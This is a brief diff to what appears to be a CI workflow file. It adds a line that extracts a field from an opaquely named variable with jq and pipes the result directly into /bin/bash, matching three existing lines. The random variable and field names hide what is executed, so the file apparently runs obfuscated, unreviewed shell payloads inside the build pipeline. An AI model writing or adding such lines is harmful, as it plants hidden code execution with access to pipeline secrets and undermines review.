@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$ff65411" | jq -r .ddu2801 | /bin/bash
           echo $gicy6 | jq -r .ycg498 | /bin/bash
           echo $wel32246 | jq -r .wkxt379 | /bin/bash
+          printf '%s' "$cmo62" | jq -r .sl586 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
